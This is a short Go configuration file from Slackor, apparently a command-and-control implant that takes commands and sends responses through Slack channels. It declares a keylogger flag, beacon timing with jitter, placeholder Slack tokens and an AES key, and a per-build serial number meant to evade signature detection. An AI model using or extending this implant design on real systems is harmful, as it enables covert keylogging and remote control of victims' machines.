// Package config manages all configuration related to Slackor components.
package config

// Global variables, some of which will get their values injected at compile

// Keylogger is an internal flag to track whether the keylogger is active
var Keylogger = false

// Beacon is the average time in seconds (with 20% jitter) between polling
var Beacon = 5 // TODO: Make jitter configurable

// ParseEnv controls whether to expand environment variables
var ParseEnv = false

// ParseBacktick controls whether to expand backticks
var ParseBacktick = false

// OSVersion is the memoized operating system version string
var OSVersion = ""

// ResponseChannel is the Slack channel to send responses to
var ResponseChannel = "RESPONSE_CHANNEL"

// RegistrationChannel is the Slack channel that implants announce their
// presence on
var RegistrationChannel = "REGISTRATION_CHANNEL"

// CommandsChannel is the Slack channel to listen for commands on
var CommandsChannel = "COMMANDS_CHANNEL"

// Bearer is the bearer token used for the bot user
var Bearer = "BEARERTOKEN" // TODO: Rename this

// Token is the bearer token used for the app
var Token = "TOKENTOKEN" // TODO: Rename this

// CipherKey is the string value of the symmetric key used to communicate
var CipherKey = "AESKEY"

// CipherKeyBytes is the CipherKey converted to a byte slice
var CipherKeyBytes = []byte(CipherKey)

// CipherIV is the initialization vector for all messages
var CipherIV = []byte("1337133713371337")

// SerialNumber is a string that gets updated on every build to circumvent simple signatures
var SerialNumber = "CHANGEME"
